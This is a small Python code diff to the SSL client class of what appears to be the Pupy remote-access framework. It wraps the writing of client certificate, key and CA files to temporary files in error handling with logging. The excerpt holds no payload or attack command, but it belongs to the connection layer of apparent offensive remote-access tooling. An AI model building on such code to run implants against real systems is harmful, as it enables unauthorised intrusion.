@@ -4,6 +4,7 @@ import socket
 import ssl
 import tempfile
 import os
+import logging
 
 from . import socks
 
@@ -114,17 +115,19 @@ class PupySSLClient(PupyTCPClient):
 
     def connect(self, host, port):
         socket = super(PupySSLClient, self).connect(host, port)
-
-        fd_cert_path, tmp_cert_path = tempfile.mkstemp()
-        fd_key_path, tmp_key_path = tempfile.mkstemp()
-        fd_ca_path, tmp_ca_path = tempfile.mkstemp()
-
-        os.write(fd_cert_path, self.SSL_CLIENT_CERT)
-        os.close(fd_cert_path)
-        os.write(fd_key_path, self.SSL_CLIENT_KEY)
-        os.close(fd_key_path)
-        os.write(fd_ca_path, self.SSL_CA_CERT)
-        os.close(fd_ca_path)
+        try:
+            fd_cert_path, tmp_cert_path = tempfile.mkstemp()
+            fd_key_path, tmp_key_path = tempfile.mkstemp()
+            fd_ca_path, tmp_ca_path = tempfile.mkstemp()
+            os.write(fd_cert_path, self.SSL_CLIENT_CERT)
+            os.close(fd_cert_path)
+            os.write(fd_key_path, self.SSL_CLIENT_KEY)
+            os.close(fd_key_path)
+            os.write(fd_ca_path, self.SSL_CA_CERT)
+            os.close(fd_ca_path)
+        except Exception as e:
+            logging.error("Error writing certificates to temp file %s"%e)
+            raise e
 
         exception = None
 
